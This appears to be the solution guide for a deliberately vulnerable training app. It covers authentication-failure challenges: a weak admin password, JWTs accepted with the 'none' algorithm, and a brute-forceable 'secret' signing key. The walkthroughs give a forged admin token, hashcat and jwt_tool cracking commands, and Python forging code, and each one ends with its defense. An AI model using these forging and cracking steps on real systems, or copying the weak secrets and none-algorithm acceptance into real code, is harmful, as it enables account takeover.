# Authentication Failures

OWASP: https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/
CWE: CWE-521, CWE-345, CWE-326

Authentication failures encompass weak passwords, broken token validation, and insufficient credential protection. These vulnerabilities allow attackers to impersonate users, forge authentication tokens, and bypass access controls.

---

## password123 Is Fine, Right? (`auth_weak_pw`)

**Difficulty:** Intern
**CWE:** CWE-521
**Route:** `POST /login`

### Intern Tier

**Vulnerability:** The admin account uses a weak, easily guessable password that appears in every common wordlist.

**Exploit:**

1. Navigate to the login page
2. Enter:

```
Username: admin
Password: trustmebro
```

3. Login succeeds. You are authenticated as the admin user.

**Solve condition:** The challenge solves when the admin user logs in with the correct weak password.

**Why it works:** Weak passwords are the lowest-hanging fruit in application security. The password `trustmebro` would be cracked in seconds by any dictionary attack. Without rate limiting, account lockout, or password complexity requirements, there is nothing to slow an attacker.

### Junior Tier

**What changed:** Same weak password. MD5 hashing (no bcrypt or scrypt).

### Senior Tier

**What changed:** Still uses the weak password, but password verification may use a slightly stronger hash function. The fundamental issue remains: the password itself is weak.

### Tech Lead Tier

**Defense:** Bcrypt password hashing with high work factor. Password complexity requirements enforce minimum length and character diversity. Account lockout after repeated failed attempts. Rate limiting on the login endpoint.

**Why it works:** Strong password hashing makes brute-force infeasible. Complexity requirements ensure passwords have sufficient entropy. Rate limiting and lockout prevent online attacks. CWE-521 is addressed through password policy enforcement and proper hashing.

---

## Algorithm? None Required (`auth_jwt_none`)

**Difficulty:** Junior
**CWE:** CWE-345
**Route:** `POST /challenges/auth/verify` (submit forged token)

### Intern Tier

**Vulnerability:** The JWT verification accepts the `none` algorithm. When a token specifies `alg: none` in its header, the server skips signature verification entirely. Any user can forge a token with arbitrary claims.

**Exploit:**

1. Construct a JWT with the `none` algorithm:

Header:
```json
{"alg": "none", "typ": "JWT"}
```

Payload:
```json
{"sub": "1", "username": "admin", "role": "admin"}
```

2. Base64url-encode each part:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

Note the trailing dot with an empty signature.

3. Submit the forged token:

```bash
curl -X POST http://localhost:8000/challenges/auth/verify \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
```

4. The server accepts the token as valid, granting admin access.

**Solve condition:** The challenge solves when a `none` algorithm token is accepted.

**Why it works:** The `none` algorithm was intended for pre-authenticated contexts where the JWT integrity is guaranteed by other means (e.g., TLS). If the server's algorithm allowlist includes `none`, any client can create unsigned tokens with arbitrary claims.

### Junior Tier

**What changed:** The `none` algorithm is removed from the accepted algorithms list. Only `HS256` is accepted.

**Bypass:** Not possible via `none` algorithm. Use the `auth_jwt_weak` challenge approach instead.

### Senior Tier

**What changed:** Same as junior. Only `HS256` accepted.

### Tech Lead Tier

**Defense:** Strict algorithm allowlist (`HS256` only). Signature verification is mandatory. Algorithm specified in the token header is ignored; the server always uses its configured algorithm for verification.

**Why it works:** By enforcing a specific algorithm server-side and ignoring the token's `alg` claim, the server prevents algorithm confusion attacks. CWE-345 is addressed by always verifying token integrity with the expected algorithm.

---

## Cracking the Culture Code (`auth_jwt_weak`)

**Difficulty:** Senior
**CWE:** CWE-326
**Route:** `POST /challenges/auth/verify` (submit forged token)

### Intern Tier

**Vulnerability:** The JWT signing secret is the string `"secret"`. This is trivially brute-forceable. Combined with the `none` algorithm acceptance, token forgery is straightforward.

**Exploit:**

1. Obtain any valid JWT from the application (e.g., by logging in)
2. Crack the signing secret using a JWT wordlist:

```bash
hashcat -m 16500 -a 0 jwt.txt wordlist.txt
```

Or use a dedicated tool:

```bash
python3 jwt_tool.py <token> -C -d wordlist.txt
```

3. The secret `"secret"` is in every common wordlist and will be found instantly
4. Forge a new token:

```python
import jwt
token = jwt.encode(
    {"sub": "1", "username": "admin", "role": "admin"},
    "secret",
    algorithm="HS256"
)
```

5. Submit the forged token to `/challenges/auth/verify`

**Solve condition:** The challenge solves when a forged admin token is accepted.

**Why it works:** Short, dictionary-word secrets have near-zero entropy against offline brute-force attacks. JWT signatures are HMAC-SHA256, which is fast to compute. Once the secret is known, the attacker can forge tokens for any user with any role.

### Junior Tier

**What changed:** `none` algorithm removed, but the signing secret remains `"secret"`. Signature verification is enforced.

**Exploit:** Same brute-force approach. Crack the secret and forge a signed token.

### Senior Tier

**What changed:** Same weak secret. The only change from junior is that algorithm validation is stricter.

**Exploit:** Same approach. The weak secret is the vulnerability, not the algorithm handling.

### Tech Lead Tier

**Defense:** Strong, randomly generated signing secret loaded from configuration (not hardcoded). Minimum 256 bits of entropy. Secret rotation policy. Algorithm strictly enforced.

**Why it works:** A cryptographically random 256-bit secret is infeasible to brute-force. Even with dedicated hardware, the search space (2^256) exceeds the computational capacity of any attacker. CWE-326 is addressed by using adequate key strength for the HMAC algorithm.
